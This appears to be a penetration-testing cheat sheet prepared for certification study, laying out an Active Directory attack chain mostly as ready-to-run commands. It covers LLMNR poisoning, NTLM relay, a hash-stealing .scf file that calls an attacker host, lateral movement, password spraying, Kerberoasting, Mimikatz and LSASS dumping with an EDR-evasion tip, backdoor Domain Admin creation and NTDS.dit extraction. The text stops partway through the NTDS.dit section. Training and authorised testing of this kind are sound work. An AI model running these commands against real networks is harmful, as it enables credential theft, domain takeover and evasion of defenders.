# Red Team Methodology

## Method Map

- `1` **Host Discovery**
  - `1.1` **Local-network discovery**
    - `1.1.1` **ARP**
      - `1.1.1.1` arp-scan
      - `1.1.1.2` Netdiscover
    - `1.1.2` ICMP range sweep
  - `1.2` **Routed-network discovery**
    - `1.2.1` **Nmap**
      - `1.2.1.1` TCP SYN probes
      - `1.2.1.2` TCP ACK probes
      - `1.2.1.3` UDP service probes
      - `1.2.1.4` Host-only sweep
- `2` **Port Scanning & Service Enumeration**
  - `2.1` **Nmap**
    - `2.1.1` Aggressive all-port scan
    - `2.1.2` SYN stealth with default scripts
- `3` **Initial Attack Vectors**
  - `3.1` **LLMNR/NBT-NS Poisoning**
    - `3.1.1` Responder hash capture
    - `3.1.2` Cracking NTLMv2 hashes
  - `3.2` **SMB Relay Attack**
    - `3.2.1` Enumerate SMB signing
    - `3.2.2` Responder relay configuration
    - `3.2.3` impacket-ntlmrelayx
  - `3.3` **IPv6 mitm6 Attack**
    - `3.3.1` mitm6
    - `3.3.2` impacket-ntlmrelayx (IPv6 relay)
  - `3.4` **SMB Share File-Based Attacks**
    - `3.4.1` Upload .scf / .lnk files
- `4` **Lateral Movement & Shell Access**
  - `4.1` **Impacket**
    - `4.1.1` impacket-psexec
    - `4.1.2` impacket-wmiexec
    - `4.1.3` impacket-smbexec
  - `4.2` **Metasploit**
    - `4.2.1` psexec module
  - `4.3` **RDP**
    - `4.3.1` xfreerdp
- `5` **Active Directory Enumeration**
  - `5.1` ldapdomaindump
  - `5.2` BloodHound
  - `5.3` PlumHound
  - `5.4` impacket-samrdump
  - `5.5` impacket-lookupsid
- `6` **Credential Attacks**
  - `6.1` **crackmapexec Suite**
    - `6.1.1` Credential validation
    - `6.1.2` SAM / LSA dump
    - `6.1.3` LSASS dump (lsassy)
    - `6.1.4` Password spraying
    - `6.1.5` Local authentication & cmedb
  - `6.2` **impacket-secretsdump**
  - `6.3` **Kerberoasting**
    - `6.3.1` impacket-GetUserSPNs
    - `6.3.2` Cracking TGS hashes
  - `6.4` **Token Impersonation**
  - `6.5` **Credential Dumping**
    - `6.5.1` Mimikatz
    - `6.5.2` LSASS dump (Task Manager)
    - `6.5.3` LSASS dump (procdump)
  - `6.6` **GPP / cPassword Attacks**
- `7` **Persistence & Domain Dominance**
  - `7.1` **User and Group Manipulation**
  - `7.2` Dumping NTDS.dit
  - `7.3` Golden Ticket Attack

## 1. Host Discovery

### 1.1 Local-network discovery

#### 1.1.1 ARP

##### 1.1.1.1 arp-scan <sup>· PJPT</sup>

```bash
sudo arp-scan -I <INTERFACE> --localnet
```

<details>
<summary>Details</summary>

**Description**

- Sends ARP requests to find active IPv4 hosts on the selected local Layer 2 network.
- Records IP, MAC, and vendor information for responding hosts.

**Parameters**

- `-I <INTERFACE>` — Selects the network interface to use.
- `--localnet` — Derives the target range from that interface's IP address and netmask.

</details>

##### 1.1.1.2 Netdiscover <sup>· PJPT</sup>

```bash
sudo netdiscover -i <INTERFACE> -r <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends ARP requests across a specified local subnet.
- Can also be used for passive ARP reconnaissance.

**Parameters**

- `-i <INTERFACE>` — Selects the interface for ARP traffic.
- `-r <IP/MASK>` — Sets the local CIDR range to scan.

</details>

#### 1.1.2 ICMP range sweep <sup>· CPTS</sup>

```bash
fping -a -g <IP/MASK> 2>/dev/null
```

<details>
<summary>Details</summary>

**Description**

- Lists addresses that answer ICMP echo requests.
- A missing reply does not prove that a host is offline.

**Parameters**

- `-a` — Shows only hosts that respond.
- `-g` — Generates addresses from the supplied CIDR range.
- `<IP/MASK>` — Target CIDR range.
- `2>/dev/null` — Suppresses error output from the shell.

</details>

### 1.2 Routed-network discovery

#### 1.2.1 Nmap

##### 1.2.1.1 TCP SYN probes <sup>· CPTS</sup>

```bash
sudo nmap -sn -PS22,80,443 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends TCP SYN packets to the specified ports to elicit a response from live hosts.
- A SYN-ACK or RST response indicates the host is up.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PS22,80,443` — Sends TCP SYN probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.2 TCP ACK probes <sup>· CPTS</sup>

```bash
sudo nmap -sn -PA80,443 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends TCP ACK packets to the specified ports, prompting a RST response from live hosts.
- Often bypasses stateless firewalls that filter SYN but not ACK packets.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PA80,443` — Sends TCP ACK probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.3 UDP service probes <sup>· CPTS</sup>

```bash
sudo nmap -sn -PU53,123,161 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Uses UDP probes to elicit responses from common infrastructure services.
- Helps identify hosts that do not answer ICMP or TCP discovery probes.
- Port 53 (DNS), 123 (NTP — Network Time Protocol), and 161 (SNMP — Simple Network Management Protocol) are commonly open on infrastructure devices.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PU53,123,161` — Sends UDP probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.4 Host-only sweep <sup>· CPTS</sup>

```bash
nmap -sn -n <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Performs Nmap host discovery without a port scan.
- Disables reverse DNS lookups for cleaner, faster output.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-n` — Disables reverse DNS resolution.
- `<IP/MASK>` — Target host or CIDR range.

</details>

## 2. Port Scanning & Service Enumeration

### 2.1 Nmap

#### 2.1.1 Aggressive all-port scan <sup>· PJPT</sup>

```bash
nmap -T4 -p- -A <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Scans all 65535 TCP ports with aggressive timing and full-featured detection.
- Performs OS detection, version detection, script scanning, and traceroute.

**Parameters**

- `-T4` — Aggressive timing template for faster scanning.
- `-p-` — Scans all TCP ports (1–65535).
- `-A` — Enables OS detection, version detection, script scanning, and traceroute.
- `<IP/MASK>` — Target host or CIDR range.

</details>

#### 2.1.2 SYN stealth with default scripts <sup>· PJPT</sup>

```bash
nmap -T4 -p- -sS -sC <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Performs a TCP SYN stealth scan across all ports and runs default NSE scripts.
- Combines fast timing with service discovery and basic vulnerability enumeration.

**Parameters**

- `-T4` — Aggressive timing template.
- `-p-` — Scans all TCP ports (1–65535).
- `-sS` — TCP SYN stealth scan (half-open, default root scan type).
- `-sC` — Runs default NSE scripts against discovered services.
- `<IP/MASK>` — Target host or CIDR range.

</details>

## 3. Initial Attack Vectors

### 3.1 LLMNR/NBT-NS Poisoning

#### 3.1.1 Responder hash capture <sup>· PJPT</sup>

```bash
sudo responder -I <INTERFACE> -dP
```

<details>
<summary>Details</summary>

**Description**

- Captures NTLMv2 hashes by poisoning LLMNR, NBT-NS, and MDNS name resolution requests.
- Listens on the specified interface and responds to name queries, directing victims to the attacker's machine.

**Parameters**

- `-I <INTERFACE>` — Network interface to listen on (e.g. tun0).
- `-d` — Suppresses answering NetBIOS domain suffix queries.
- `-P` — Suppresses answering Proxy Auth requests.

</details>

#### 3.1.2 Cracking NTLMv2 hashes <sup>· PJPT</sup>

**With hashcat:**

```bash
hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
```

**With John the Ripper:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Cracks captured NTLMv2 hashes offline using a wordlist.
- After capturing a hash with Responder, copy it to a file and crack it.
- Useful when hashcat is unavailable or memory-constrained — John the Ripper detects the NTLMv2 format automatically.

**Parameters**

- `-m 5600` — Hash type for NetNTLMv2 (hashcat).
- `--wordlist=<WORDLIST>` — Wordlist for dictionary attack (John).
- `<HASH_FILE>` — File containing the captured NTLMv2 hash.

</details>

### 3.2 SMB Relay Attack

#### 3.2.1 Enumerate SMB signing <sup>· PJPT</sup>

```bash
nmap -p445 <IP/MASK> --script=smb2-security-mode
```

<details>
<summary>Details</summary>

**Description**

- Checks whether SMB message signing is required on discovered hosts.
- The SMB relay attack works only when SMB signing is disabled or not required.
- If signing is `enabled and required`, that host cannot be used as a relay target.

**Parameters**

- `-p445` — Scans only the SMB port.
- `--script=smb2-security-mode` — Runs the NSE script that reports SMB signing requirements.
- `<IP/MASK>` — Target host or CIDR range.

</details>

#### 3.2.2 Responder relay configuration <sup>· PJPT</sup>

Edit the Responder configuration to disable SMB and HTTP services:

```bash
sudo nano /etc/responder/Responder.conf
```

Set the following values:

```
SMB = Off
HTTP = Off
```

Then start Responder:

```bash
sudo responder -I <INTERFACE> -dP
```

<details>
<summary>Details</summary>

**Description**

- Disables Responder's built-in SMB and HTTP servers so that traffic is handed off to the NTLM relay tool.
- Responder continues to poison name resolution requests while the relay tool handles authentication.

</details>

#### 3.2.3 impacket-ntlmrelayx <sup>· PJPT</sup>

**Dump password hashes:**

```bash
sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support
```

**Create an interactive SMB shell:**

```bash
sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -i
```

**Execute a command on all relayed targets:**

```bash
sudo impacket-ntlmrelayx -tf <TARGETS_FILE> -smb2support -c "whoami"
```

<details>
<summary>Details</summary>

**Description**

- Relays captured NTLM authentications to target systems where SMB signing is disabled.
- Can dump local SAM hashes, launch interactive SMB shells, or execute arbitrary commands.

**Parameters**

- `-tf <TARGETS_FILE>` — File containing target IP addresses, one per line.
- `-smb2support` — Enables SMBv2 support for the relay.
- `-i` — Opens an interactive SMB shell after a successful relay.
- `-c <COMMAND>` — Executes the given command on the relayed target.

</details>

### 3.3 IPv6 mitm6 Attack

#### 3.3.1 mitm6 <sup>· PJPT</sup>

```bash
sudo mitm6 -d <DOMAIN>
```

<details>
<summary>Details</summary>

**Description**

- If IPv6 is enabled on the network but no DNS server for IPv6 exists, mitm6 can impersonate one.
- Spoofs DHCPv6 and DNS replies to redirect WPAD traffic to the attacker's machine.
- Must be run concurrently with impacket-ntlmrelayx (in a separate terminal) to relay captured authentication.

**Parameters**

- `-d <DOMAIN>` — The target Active Directory domain (e.g., `test.local`).

</details>

#### 3.3.2 impacket-ntlmrelayx (IPv6 relay) <sup>· PJPT</sup>

```bash
sudo impacket-ntlmrelayx -6 -t ldap://<DC_IP> -wh fakewpad.<DOMAIN> -l <LOOT_DIR>
```

<details>
<summary>Details</summary>

**Description**

- Relays authentication captured via mitm6 to LDAP(S) on the domain controller, enabling domain object manipulation.
- Results are saved as HTML reports in the specified loot directory (e.g., `domain_computers.html`).
- Use `ldaps://` for encrypted LDAP; `ldap://` works if signing is not enforced.
- Requires mitm6 running concurrently in a separate terminal.

**Parameters**

- `-6` — Enables IPv6 mode.
- `-t ldap://<DC_IP>` — Target domain controller over LDAP(S).
- `-wh fakewpad.<DOMAIN>` — Spoofed WPAD hostname for the relay.
- `-l <LOOT_DIR>` — Directory where enumerated domain information is saved.

</details>

### 3.4 SMB Share File-Based Attacks

#### 3.4.1 Upload .scf / .lnk files <sup>· PJPT</sup>

**Create a malicious .scf file:**

```bash
echo '[Shell]' > @pwn.scf
echo 'Command=2' >> @pwn.scf
echo 'IconFile=\\<ATTACKER_IP>\icon.ico' >> @pwn.scf
echo '[Taskbar]' >> @pwn.scf
echo 'Command=ToggleDesktop' >> @pwn.scf
```

**Generate .lnk files with ntlm_theft:**

```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
cd ntlm_theft
python3 ntlm_theft.py -g lnk -s <ATTACKER_IP> -f pwn
```

**Upload to a writable SMB share:**

```bash
smbclient //<DC_IP>/"Share Name" -U <USERNAME> -W <DOMAIN> -m SMB3
smb: \> put @pwn.scf
smb: \> put pwn.lnk
```

<details>
<summary>Details</summary>

**Description**

- If a writable SMB share is found, upload .scf or .lnk files that contain an icon path pointing to the attacker's SMB server.
- When a user browses the share in Windows Explorer, their machine attempts to load the icon file, sending their NTLMv2 hash to the attacker.
- Capture the hash with Responder running concurrently.

**Parameters**

- `//<DC_IP>/"Share Name"` — Target SMB share path (quote if share name contains spaces).
- `-U <USERNAME>` — Username for SMB authentication.
- `-W <DOMAIN>` — Domain or workgroup name.
- `-m SMB3` — Force SMB3 protocol.

</details>

## 4. Lateral Movement & Shell Access

### 4.1 Impacket

#### 4.1.1 impacket-psexec <sup>· PJPT</sup>

**For domain users:**

```bash
impacket-psexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

**For local users:**

```bash
impacket-psexec <USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

**With password hash:**

```bash
impacket-psexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Obtains a semi-interactive shell on a remote Windows system via the SMB protocol.
- Creates a Windows service on the target, runs commands through it, and deletes it on exit.

**Parameters**

- `<DOMAIN>/<USERNAME>` — Domain-qualified username or `./<USERNAME>` for local accounts.
- `'<PASSWORD>'` — User password (quote if it contains special characters).
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash instead of a password.
- `<LOCAL_ADMIN>` — Local administrator account (default `Administrator` but may vary by language/build).
- `<TARGET_IP>` — IP address of the target machine.

</details>

#### 4.1.2 impacket-wmiexec <sup>· PJPT</sup>

```bash
impacket-wmiexec <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Provides a semi-interactive shell via Windows Management Instrumentation (WMI).
- Uses DCOM/WMI instead of SMB services, often evading detection better than psexec.

**Parameters**

- `<LOCAL_ADMIN>@<TARGET_IP>` — Username and target IP.
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticates using NTLM hash.

</details>

#### 4.1.3 impacket-smbexec <sup>· PJPT</sup>

```bash
impacket-smbexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

<details>
<summary>Details</summary>

**Description**

- Semi-interactive shell similar to psexec but uses native Windows SMB admin shares for I/O.
- Commands are executed through batch scripts written to the ADMIN$ share.

</details>

### 4.2 Metasploit

#### 4.2.1 psexec module <sup>· PJPT</sup>

```
use exploit/windows/smb/psexec
set SMBDomain <DOMAIN>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set RHOSTS <TARGET_IP>
run
```

<details>
<summary>Details</summary>

**Description**

- Metasploit module that delivers a Meterpreter payload via the same SMB service-creation technique.
- Supports both local and domain authentication.

**Parameters**

- `SMBDomain` — Target domain (use `.` for local accounts).
- `SMBUser` — Username for authentication.
- `SMBPass` — Password for authentication.
- `RHOSTS` — Target IP address or range.

</details>

### 4.3 RDP

#### 4.3.1 xfreerdp <sup>· PJPT</sup>

**For domain users:**

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:'<PASSWORD>' /d:<DOMAIN> /cert:ignore
```

**For local accounts:**

```bash
xfreerdp /v:<TARGET_IP> /u:.\<USERNAME> /p:'<PASSWORD>' /cert:ignore
```

<details>
<summary>Details</summary>

**Description**

- Connects to a Windows host via Remote Desktop Protocol for graphical access.
- Useful for running GUI-based tools (Task Manager, Mimikatz) on the target.

**Parameters**

- `/v:<TARGET_IP>` — Target IP address.
- `/u:<USERNAME>` — Username for authentication. Use `.\<USERNAME>` for local accounts.
- `/p:'<PASSWORD>'` — Password (quote if it contains special characters).
- `/d:<DOMAIN>` — Domain name (omit for local accounts).
- `/cert:ignore` — Ignores certificate validation errors.

</details>

## 5. Active Directory Enumeration

### 5.1 ldapdomaindump <sup>· PJPT</sup>

```bash
sudo ldapdomaindump ldaps://<DC_IP> -u '<DOMAIN>\\<USERNAME>' -p <PASSWORD>
```

For output to a specific directory:

```bash
ldapdomaindump -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' <DC_IP> -o <OUTPUT_DIR>
```

<details>
<summary>Details</summary>

**Description**

- Dumps Active Directory information via LDAP and produces human-readable HTML reports.
- Generates files detailing domain users, groups, computers, trusts, and policies.
- Works with standard domain credentials — does not require elevated privileges.

**Parameters**

- `ldaps://<DC_IP>` — Domain controller address over LDAPS.
- `-u '<DOMAIN>\\<USERNAME>'` — Domain-qualified username.
- `-p <PASSWORD>` — User password.
- `-o <OUTPUT_DIR>` — Output directory for generated HTML/JSON files.

</details>

### 5.2 BloodHound <sup>· PJPT</sup>

**Collect data with BloodHound-Python (v1.9.0):**

```bash
cd ~/Desktop/bloodhound-python
source venv/bin/activate
bloodhound-python \
  -u '<USERNAME>' \
  -p '<PASSWORD>' \
  -d '<DOMAIN>' \
  -ns '<DC_IP>' \
  -c All \
  --zip
```

**Start the analysis platform — BloodHound Legacy (v4.3.1) + Neo4j (v4.4.19):**

```bash
sudo systemctl start docker.socket
sudo systemctl start docker
sudo docker start neo4j-bloodhound
cd ~/Desktop/BloodHound-linux-arm64
./BloodHound --no-sandbox --disable-gpu
```

Drag and drop the generated JSON files (or ZIP) into the BloodHound GUI.

<details>
<summary>Details</summary>

**Description**

- Maps Active Directory attack paths by collecting and analysing relationships between users, groups, computers, and permissions.
- BloodHound-Python v1.9.0 collects data remotely and was designed for the legacy BloodHound GUI (v4.3.1).
- Neo4j v4.4.19 is the database backend recommended for legacy BloodHound.

**bloodhound-python Parameters**

- `-d '<DOMAIN>'` — Target AD domain.
- `-u '<USERNAME>'` — Username for LDAP authentication.
- `-p '<PASSWORD>'` — Password for LDAP authentication.
- `-ns '<DC_IP>'` — Domain controller IP used for name resolution.
- `-c All` — Collects all available data categories.
- `--zip` — Outputs results as a single ZIP file for easier import.

</details>

### 5.3 PlumHound <sup>· PJPT</sup>

**PlumHound v1.7.8:**

```bash
cd ~/Desktop/PlumHound
source venv/bin/activate

# Test database connectivity
python PlumHound.py --easy \
  -s bolt://127.0.0.1:7687 \
  -u neo4j \
  -p <NEO4J_PASSWORD>

# Generate standard reports
python PlumHound.py \
  -x tasks/default.tasks \
  -s bolt://127.0.0.1:7687 \
  -u neo4j \
  -p <NEO4J_PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Runs on top of BloodHound's Neo4j database to automate common AD attack path analysis.
- Produces HTML reports of actionable vulnerabilities and attack paths.
- Neo4j and BloodHound must already be running before executing PlumHound.

**Parameters**

- `--easy` — Runs a simplified set of preconfigured queries.
- `-x tasks/default.tasks` — Executes a custom task file.
- `-s bolt://127.0.0.1:7687` — Neo4j Bolt connection string.
- `-u neo4j` — Neo4j database username.
- `-p <NEO4J_PASSWORD>` — Password for the Neo4j database.

</details>

### 5.4 impacket-samrdump <sup>· PJPT</sup>

```bash
impacket-samrdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
```

<details>
<summary>Details</summary>

**Description**

- Enumerates domain users and their attributes via the SAMR (Security Account Manager Remote) protocol.
- A lightweight alternative to ldapdomaindump for a quick user listing with password policy details.
- Requires standard domain credentials — no elevated privileges needed.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain credentials.
- `<DC_IP>` — Domain controller IP address.

</details>

### 5.5 impacket-lookupsid <sup>· PJPT</sup>

```bash
impacket-lookupsid <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP>
```

<details>
<summary>Details</summary>

**Description**

- Enumerates domain users and groups by brute-forcing Security Identifiers (SIDs) via the LSARPC protocol.
- Also returns the domain SID, which is required for Golden Ticket attacks.
- Requires standard domain credentials.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain credentials.
- `<DC_IP>` — Domain controller IP address.

</details>

## 6. Credential Attacks

### 6.1 crackmapexec Suite

#### 6.1.1 Credential validation <sup>· PJPT</sup>

**Validate credentials across the network via SMB:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>
```

**Validate using a password hash:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -H <NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Tests credentials across an entire subnet over the SMB protocol.
- A `Pwn3d!` result indicates local administrator rights on that machine.
- Supports both cleartext passwords and NTLM hashes.

**Parameters**

- `smb` — Protocol to test (SMB).
- `<IP/MASK>` — Target subnet range.
- `-d <DOMAIN>` — Active Directory domain name.
- `-u <USERNAME>` — Username to test.
- `-p <PASSWORD>` — Cleartext password.
- `-H <NTLM_HASH>` — NTLM hash for Pass-the-Hash authentication.

</details>

#### 6.1.2 SAM / LSA dump <sup>· PJPT</sup>

**Dump SAM hashes:**

```bash
crackmapexec smb <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --sam
```

**Dump LSA secrets:**

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --lsa
```

<details>
<summary>Details</summary>

**Description**

- `--sam` dumps local SAM hashes from the target and stores them in the cmedb database.
- `--lsa` dumps LSA secrets including cached credentials and service account passwords (these are not stored in cmedb).
- Both require local administrator privileges on the target.

</details>

#### 6.1.3 LSASS dump (lsassy) <sup>· PJPT</sup>

```bash
crackmapexec smb <IP/MASK> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -M lsassy
```

<details>
<summary>Details</summary>

**Description**

- Extracts credentials from LSASS memory remotely through SMB using the lsassy module.
- Dumped credentials are stored in the cmedb database for later retrieval.
- Requires local administrator privileges on the target.

</details>

#### 6.1.4 Password spraying <sup>· PJPT</sup>

**Spray a password against a list of users:**

```bash
crackmapexec smb <IP/MASK> -u <USERS_FILE> -p '<PASSWORD>' --continue-on-success
```

**Spray a password hash against a list of users:**

```bash
crackmapexec smb <IP/MASK> -u <USERS_FILE> -H <NTLM_HASH> --continue-on-success
```

<details>
<summary>Details</summary>

**Description**

- Tests a single password or hash against every user in a file, continuing even after finding a match.
- Useful for discovering password reuse across domain accounts.
- The `--continue-on-success` flag ensures all users are tested, not just the first match.

**Parameters**

- `-u <USERS_FILE>` — File containing a list of usernames, one per line.
- `--continue-on-success` — Continues testing even after successful authentications.
- `<PASSWORD>` — Password to spray (quote if it contains special characters).

</details>

#### 6.1.5 Local authentication & cmedb <sup>· PJPT</sup>

**Test local credentials (non-domain):**

```bash
crackmapexec smb <IP/MASK> -u <USERNAME> -p <PASSWORD> --local-auth
```

**Access the crackmapexec database:**

```bash
cmedb
```

<details>
<summary>Details</summary>

**Description**

- `--local-auth` authenticates to the local SAM of each target instead of the domain.
- `cmedb` provides access to the crackmapexec database, which stores discovered hosts, credentials, and dumped SAM hashes from prior runs.
- Use cmedb to review and export previously gathered credentials without re-scanning.

</details>

### 6.2 impacket-secretsdump <sup>· PJPT</sup>

**Dump local hashes with credentials:**

```bash
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
```

**Dump local hashes with a password hash:**

```bash
impacket-secretsdump <LOCAL_ADMIN>@<TARGET_IP> --hashes <LM_HASH>:<NTLM_HASH>
```

<details>
<summary>Details</summary>

**Description**

- Extracts SAM, LSA secrets, and cached credentials from a remote Windows machine.
- Requires local administrator privileges on the target.

**Parameters**

- `<DOMAIN>/<USERNAME>` — Domain-qualified username.
- `<PASSWORD>` — User password.
- `--hashes <LM_HASH>:<NTLM_HASH>` — Authenticate using NTLM hash instead of password.
- `<LOCAL_ADMIN>` — Local administrator account (default `Administrator` but may vary).
- `<TARGET_IP>` — IP address of the target machine.

</details>

### 6.3 Kerberoasting

#### 6.3.1 impacket-GetUserSPNs <sup>· PJPT</sup>

```bash
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Requests Ticket Granting Service (TGS) tickets for accounts with Service Principal Names (SPNs).
- Any domain user can request these tickets; the encrypted portion is derived from the service account's password.
- The returned hash can be cracked offline to recover the plaintext password.

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Credentials of any domain user.
- `-dc-ip <DC_IP>` — Domain controller IP address.
- `-request` — Requests TGS tickets for discovered SPN accounts.
- `-outputfile <OUTPUT_FILE>` — Saves the captured TGS hashes to a file for cracking.

</details>

#### 6.3.2 Cracking TGS hashes <sup>· PJPT</sup>

**With hashcat:**

```bash
hashcat -m 13100 <TGS_HASH_FILE> /usr/share/wordlists/rockyou.txt
```

**With John the Ripper:**

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt <TGS_HASH_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Cracks Kerberos TGS ticket hashes offline.
- Copy the hash output from impacket-GetUserSPNs into a file crackable by hashcat or John.
- John requires explicit format specification (`--format=krb5tgs`) for Kerberos TGS hashes.

**Parameters**

- `-m 13100` — Hash type for Kerberos 5 TGS-REP etype 23 (hashcat).
- `--format=krb5tgs` — Hash format for Kerberos TGS (John).
- `<TGS_HASH_FILE>` — File containing the captured TGS hashes.
- `/usr/share/wordlists/rockyou.txt` — Wordlist for dictionary attack.

</details>

### 6.4 Token Impersonation <sup>· PJPT</sup>

**Load the incognito module:**

```
load incognito
```

**List available user tokens:**

```
list_tokens -u
```

**Impersonate a user token:**

```
impersonate_token DOMAIN\\USERNAME
```

<details>
<summary>Details</summary>

**Description**

- If a Meterpreter shell is active on a system, all available tokens on that machine can be enumerated.
- The incognito module must be loaded first before listing and impersonating tokens.
- You can impersonate any user whose token is present (e.g. a domain administrator who logged in previously).

**Commands**

- `load incognito` — Loads the incognito extension in the Meterpreter session.
- `list_tokens -u` — Lists all user tokens available on the compromised system.
- `impersonate_token DOMAIN\\USERNAME` — Adopts the security context of the specified user.

</details>

### 6.5 Credential Dumping

#### 6.5.1 Mimikatz <sup>· PJPT</sup>

```
privilege::debug
lsadump::lsa /patch
sekurlsa::minidump <LSASS_DUMP>
sekurlsa::logonPasswords
kerberos::list
```

<details>
<summary>Details</summary>

**Description**

- Extracts plaintext passwords, NTLM hashes, Kerberos tickets, and PINs from LSASS memory.
- Can operate on a live system or on an offline memory dump.

**Commands**

- `privilege::debug` — Enables SeDebugPrivilege for memory access.
- `lsadump::lsa /patch` — Dumps LSA secrets from the running system.
- `sekurlsa::minidump <LSASS_DUMP>` — Loads an offline LSASS dump file into Mimikatz.
- `sekurlsa::logonPasswords` — Extracts credentials from LSASS memory.
- `kerberos::list` — Lists all Kerberos tickets in the current session, including injected Golden Tickets.

</details>

#### 6.5.2 LSASS dump via Task Manager <sup>· PJPT</sup>

1. Open Task Manager → **Details** tab
2. Find `lsass.exe`
3. Right-click → **Create dump file** → `<LSASS_DUMP>`
4. Transfer the dump file to your Kali machine
5. Extract credentials:

```bash
pypykatz lsa minidump <LSASS_DUMP>
```

<details>
<summary>Details</summary>

**Description**

- Uses the Windows Task Manager GUI to create a memory dump of the LSASS process.
- Requires graphical access to the target (RDP, VNC, or physical access).

</details>

#### 6.5.3 LSASS dump via procdump <sup>· PJPT</sup>

```bash
procdump.exe -accepteula -ma lsass.exe <DUMP_FILE>
```

Alternatively, use the process ID to evade string-based EDR detection:

```powershell
Get-Process lsass
```

```cmd
tasklist | findstr lsass
```

```bash
procdump.exe -accepteula -ma <PID> <DUMP_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Dumps the LSASS process memory using the Sysinternals procdump tool.
- Using the PID instead of the process name may help evade EDR solutions that monitor for `lsass.exe` strings.

**Parameters**

- `-accepteula` — Accepts the Sysinternals license agreement silently.
- `-ma` — Writes a full memory dump.
- `<PID>` — Process ID of lsass.exe.
- `<DUMP_FILE>` — Destination filename for the memory dump.

</details>

### 6.6 GPP / cPassword Attacks <sup>· PJPT</sup>

**Find cPassword in SYSVOL with Metasploit:**

```
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS <DC_IP>
set SMBDomain <DOMAIN>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
run
```

**Decrypt the cPassword:**

```bash
gpp-decrypt <CIPHERED_PASSWORD>
```

<details>
<summary>Details</summary>

**Description**

- Group Policy Preferences (GPP) historically stored passwords in XML files encrypted with a publicly known AES key.
- These XML files can often be found on the NETLOGON and SYSVOL shares of domain controllers.
- `gpp-decrypt` (installed by default on Kali) decrypts `cPassword` values found in GPP XML files.

**Metasploit Module Parameters**

- `RHOSTS` — Domain controller IP address.
- `SMBDomain` — Target AD domain.
- `SMBUser` — Username for SMB authentication.
- `SMBPass` — Password for SMB authentication.

</details>

## 7. Persistence & Domain Dominance

### 7.1 User and Group Manipulation <sup>· PJPT</sup>

**Create a local user and add to the local Administrators group:**

```cmd
net user /add <USERNAME> <PASSWORD>
net localgroup Administrators <USERNAME> /add
```

**Create a domain user and add to the Domain Admins group:**

```cmd
net user /add <USERNAME> <PASSWORD> /domain
net group "Domain Admins" <USERNAME> /ADD /DOMAIN
```

<details>
<summary>Details</summary>

**Description**

- When running with sufficient privileges, creates new users and adds them to privileged groups.
- Can be used for persistence or to create alternate access accounts.
- Works against both local SAM and Active Directory domains (when executed on a domain controller or with delegated rights).
- Creating a domain user requires a Golden Ticket or Domain Admin credentials injected into the session.

</details>

### 7.2 Dumping NTDS.dit <sup>· PJPT</sup>

```bash
impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc-ntlm
```

<details>
<summary>Details</summary>

**Description**

- Extracts the NTDS.dit database from a domain controller, which contains NTLM hashes for every domain user.
- Requires Domain Admin or equivalent privileges.
- Quote the credentials string if the password contains special characters (e.g. `'DOMAIN/admin:Pass!@#'`).

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain admin credentials.
- `-just-dc-ntlm` — Dumps only NTLM hashes from the domain controller (fastest method).
